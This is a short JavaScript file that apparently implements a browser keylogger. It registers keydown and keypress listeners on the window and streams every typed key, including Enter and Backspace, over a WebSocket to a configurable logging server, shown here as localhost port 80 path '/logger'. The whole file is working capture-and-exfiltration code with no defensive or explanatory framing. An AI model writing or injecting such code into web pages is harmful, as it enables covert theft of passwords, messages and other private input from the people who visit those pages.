const rhost = '127.0.0.1';		//
const rport = 80;				// Server Information
const rpath = '/logger';		//


const ws = new WebSocket(`ws://${rhost}:${rport}${rpath}`);

ws.onmessage = (msg) => {
	if (msg.data != "ok") {
		console.log("Internal Server Error");
	}
}


window.addEventListener('keydown', key => {
	if (key.keyCode === 13 || key.keyCode === 8) {
		ws.send(key.keyCode);
	}
});

window.addEventListener('keypress', key => {
	if (key.keyCode != 13) {
		ws.send(key.key);
	}
});


